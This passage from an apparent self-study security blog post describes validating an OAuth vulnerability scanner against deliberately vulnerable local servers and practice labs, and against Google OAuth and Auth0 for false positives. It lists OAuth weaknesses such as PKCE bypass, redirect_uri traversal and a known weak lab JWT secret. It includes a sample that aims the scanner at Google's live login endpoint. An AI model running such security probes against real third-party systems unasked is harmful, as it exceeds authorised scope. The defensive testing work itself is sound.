		print("   This likely means your scanner needs tuning, not that Auth0 has bugs")
		for vuln in vulnerabilities:
			print(f"   • {vuln['type']}: {vuln['description']}")
		return False
	else:
		print("✓ Correct: No false positives against Auth0")
		print("   Your scanner correctly recognizes professional OAuth implementation")
		return True
```

**Setting Up Auth0 for Testing**:

1. **Create Free Tenant**: Sign up at https://auth0.com (free tier available)
2. **Create Application**: Applications → Create Application → Regular Web Application
3. **Configure Settings**:
   - Allowed Callback URLs: `http://localhost:3000/callback`
   - Allowed Logout URLs: `http://localhost:3000`
   - Copy `Client ID` and `Client Secret`
4. **Test OAuth Flows**:
   - Use Postman or curl to test authorization flow
   - Verify PKCE implementation
   - Test scope enforcement
   - Validate token introspection

**Expected Behavior** (All Should Be Secure):
- ✅ Exact redirect_uri matching
- ✅ Authorization code single-use enforcement
- ✅ PKCE validation for public clients
- ✅ Proper scope enforcement
- ✅ JWT signature validation
- ✅ TLS enforcement
- ✅ Token expiration

**Expected Scanner Behavior**: Should find ZERO vulnerabilities

**Reality Check**: Auth0 is trusted by major enterprises. If your scanner flags it, you almost certainly have a false positive. However, always verify - security research sometimes uncovers issues even in well-audited systems!

---

## Testing Strategy: Vulnerable vs "Secure" Implementations

**Why Test Against BOTH?**

| Implementation Type | What It Is | Purpose | Expected Result |
|---------------------|------------|---------|-----------------|
| **Vulnerable** (6 Python servers, PortSwigger, crAPI, etc.) | Known broken OAuth | Detect false negatives | SHOULD find 77+ vulnerabilities |
| **"Secure"** (Google OAuth, Auth0) | Professional OAuth (supposedly :) ) | Detect false positives | Should find ZERO vulnerabilities |

**The "Supposedly Secure" Caveat**:

When I say Google OAuth and Auth0 are "secure," I mean:
- ✅ They're professional implementations with security teams
- ✅ They're used in production by millions of applications  
- ✅ They're regularly audited and monitored
- ✅ They *should* follow OAuth 2 in Action security principles
- ⚠️ **BUT**: No system is perfectly secure - always test with healthy skepticism!

**If your scanner**:
- ✅ Finds issues in vulnerable targets AND finds nothing in "secure" targets → **EXCELLENT**
- ⚠️ Finds issues in vulnerable targets BUT also flags "secure" targets → **FALSE POSITIVES** (probably)
- ❌ Misses issues in vulnerable targets → **FALSE NEGATIVES** (critical failure)
- ❌ Flags "secure" targets but misses vulnerable ones → **Completely broken scanner**

**Exception**: If your scanner genuinely finds a real vulnerability in Google OAuth or Auth0, congratulations - you've found a bug bounty! But statistically, it's more likely to be a false positive in your scanner.

---

## Quick Reference: What to Use When

Here's a clear breakdown of when to use each type of resource:

| Resource Type | Examples | Use For | Expected Outcome | When to Use |
|---------------|----------|---------|------------------|-------------|
| **OAuth Development Tools** | Google OAuth Playground, jwt.io, Postman, Burp Suite | Testing that your Python script WORKS | Script successfully makes OAuth requests | During development - building your scanner |
| **Vulnerable OAuth Implementations** | 6 Python servers (localhost:5001-5006), PortSwigger labs, crAPI, Juice Shop, Pixi | Testing that your scanner DETECTS vulnerabilities | Find 77+ known issues | Validation - testing for false negatives |
| **"Secure" OAuth Implementations** | Google OAuth, Auth0 | Testing that your scanner doesn't OVER-FLAG | Find 0 issues (hopefully!) | Validation - testing for false positives |

**Example Testing Workflow**:

```python
# STAGE 1: Development (Test your script works)
print("Stage 1: Testing that my OAuth client code works...")

# Use Google OAuth Playground to get real tokens
# Test your script can parse them
test_my_oauth_client_works()  # ✓ Script can make valid requests

# STAGE 2: Vulnerability Detection (Test scanner finds issues)
print("\nStage 2: Testing that my scanner detects vulnerabilities...")

# Test against 6 Python servers (should find 77+ issues)
for port in range(5001, 5007):
	scanner = OAuthSecurityTester(f"http://localhost:{port}")
	vulns = scanner.run_all_tests()
	print(f"Server on port {port}: Found {len(vulns)} vulnerabilities")
	# ✓ Scanner successfully detects known vulnerabilities

# STAGE 3: False Positive Check (Test scanner doesn't over-flag)
print("\nStage 3: Testing that my scanner doesn't have false positives...")

# Test against Google OAuth and Auth0 (should find 0 issues)
scanner = OAuthSecurityTester("https://accounts.google.com")
vulns = scanner.run_all_tests()
print(f"Google OAuth: Found {len(vulns)} vulnerabilities")
# ✓ Scanner correctly recognizes secure implementation (0 issues)
```

---

## Complete Testing Checklist

Use this checklist for your OAuth security scanner validation:

**Phase 1: False Negative Detection Against Python OAuth Servers (PRIMARY)**
- [ ] **Server A** (localhost:5001): Authorization code reuse
- [ ] **Server A**: Redirect URI directory traversal
- [ ] **Server A**: Error handling (HTTP 400 vs 30x)
- [ ] **Server B** (localhost:5002): PKCE bypass (missing code_challenge)
- [ ] **Server B**: PKCE verifier mismatch
- [ ] **Server B**: Refresh token rotation
- [ ] **Server C** (localhost:5003): Scope escalation at token endpoint
- [ ] **Server C**: Unauthorized scope at resource server
- [ ] **Server D** (localhost:5004): Client authentication timing attack
- [ ] **Server D**: Token storage (plaintext vs hashed)
- [ ] **Server E** (localhost:5005): TLS enforcement bypass
- [ ] **Server E**: HTTP downgrade acceptance
- [ ] **Server F** (localhost:5006): Unauthenticated client registration
- [ ] **Server F**: Dangerous redirect URI schemes (javascript:, data:)
- [ ] **Total**: Detect 77+ vulnerabilities across all 6 servers

**Phase 2: Validation Against Known Vulnerable Apps**
- [ ] crAPI JWT secret weakness (HS512 with "crapi")
- [ ] crAPI JWT algorithm confusion (HS512 → HS256)
- [ ] Pixi authorization bypass (user token at admin endpoint)
- [ ] Pixi missing token validation
- [ ] Juice Shop excessive data exposure
- [ ] PortSwigger implicit flow email tampering
- [ ] PortSwigger redirect_uri directory traversal
- [ ] PortSwigger OAuth CSRF (missing state validation)

**Phase 3: False Positive Testing (Must NOT Flag These)**
- [ ] Google OAuth authorization endpoint
- [ ] Google OAuth token endpoint
- [ ] Auth0 authorization flow
- [ ] Auth0 token validation

**Phase 4: Coverage Validation (OAuth 2 in Action Principles)**
Test all OAuth 2 in Action security principles:
- [ ] Redirect URI exact matching (Chapter 9, pages 158-167)
- [ ] Authorization code single-use (Chapter 9, page 167)
- [ ] PKCE validation (Chapter 10, pages 177-183)
- [ ] State parameter CSRF protection (Chapter 7, page 138)
- [ ] Token-user binding
- [ ] TLS enforcement
- [ ] Token expiration
- [ ] Scope validation
- [ ] Client authentication
- [ ] Error handling (HTTP 400 vs redirects)
- [ ] Token storage (hashed vs plaintext)
- [ ] Rate limiting
- [ ] Timing attack resistance
- [ ] Refresh token rotation
- [ ] Dynamic client registration (RFC 7591)

---

## Resources

**Primary Testing Targets**:
- [PortSwigger Web Security Academy - OAuth Labs](https://portswigger.net/web-security/oauth)
- [crAPI - Completely Ridiculous API](https://github.com/OWASP/crAPI)
- [OWASP Juice Shop](https://github.com/juice-shop/juice-shop)

**CTF Platforms**:
- [TryHackMe - API Security Rooms](https://tryhackme.com/)
- [HackTheBox - OAuth Challenge Machines](https://www.hackthebox.com/)

**References**:
- Richer, Justin & Sanso, Antonio. *OAuth 2 in Action*. Manning Publications, 2017
  - Chapter 7: Common Client Vulnerabilities (pages 119-138)
  - Chapter 9: Common Authorization Server Vulnerabilities (pages 149-167)
  - Chapter 10: Common Token Vulnerabilities (pages 169-183)
- Madden, Neil. *API Security in Action*. Manning Publications, 2020
- Schumacher, Corey. *Hacking APIs*. No Starch Press, 2022
  - Chapter 5: Setting Up Vulnerable API Targets (pages 109-116)

## Next Steps for Your OAuth Security Journey

**Week 6 (Current)**: OAuth 2.0 + Applied Cryptography

I'm building a comprehensive OAuth security scanner as part of my transition from Intel Security Engineering (IPAS division threat modeling) to General Security Engineering roles.

**My testing approach**:

1. ✅ Testing my Python OAuth security scanner against **6 local Python servers** (77+ vulnerabilities, localhost:5001-5006)
2. ✅ Validating against PortSwigger's 6 OAuth labs
3. ✅ Running against crAPI, Juice Shop, and Pixi (Docker)
4. ✅ Testing against Google OAuth and Auth0 for false positive detection
5. ✅ Publishing findings and scanner on GitHub

The scanner will test all security principles from OAuth 2 in Action Chapters 7, 9, and 10, with each test citing specific page numbers for reference.

**Testing Priority**:
1. **PRIMARY**: 6 Python OAuth servers (complete control, 77+ issues, 100% OAuth 2 in Action coverage)
2. **SECONDARY**: PortSwigger labs (professional validation)
3. **TERTIARY**: Docker apps (additional real-world testing)
4. **BASELINE**: Google OAuth / Auth0 (false positive checks)

**Expected Results**:
- 77+ vulnerabilities detected across 6 Python servers
- 6+ vulnerabilities in PortSwigger labs
- 10+ vulnerabilities in crAPI/Juice Shop/Pixi
- 0 false positives against Google OAuth/Auth0

---

## Why This Matters for Your Career

If you're pursuing **General Security Engineering** roles (like I am), OAuth security testing isn't optional:

**Companies I'm targeting** all require OAuth knowledge:
- Trail of Bits: "Experience with authentication protocols (OAuth, SAML, OpenID Connect)"
- GitLab: "Understanding of OAuth 2.0 flows and common security pitfalls"
- Stripe: "Knowledge of API security including OAuth token management"
- Anthropic: "Familiarity with identity and access management patterns"

**From Grace Nolan's Security Engineering methodology**: OAuth appears in Week 6 (Applied Crypto + OAuth), Week 7 (CSRF + State Parameter), Week 13 (Threat Modeling), and Week 18 (Manual Exploitation) - **4 out of 48 weeks** of the curriculum.

**From "I did 85 security engineer on-sites"**: OAuth testing questions appear in:
- Code review scenarios
- System design interviews
- Security architecture discussions
- Incident response scenarios

**You can't escape OAuth** if you're pursuing Security Engineering roles. Build this skill now.

**Coming Next**: Building a LeetCode-style OAuth security exercise with ~60 test cases covering redirect_uri validation, PKCE implementation, and state parameter CSRF protection. Stay tuned!

---

*This is part of my 48-week Security Engineering self-study curriculum. Follow along at [dev.to/fosres](https://dev.to/fosres) or check out my [GitHub](https://github.com/fosres) for code samples.*

*Have you tested OAuth implementations before? What vulnerabilities surprised you most? Drop a comment below!*
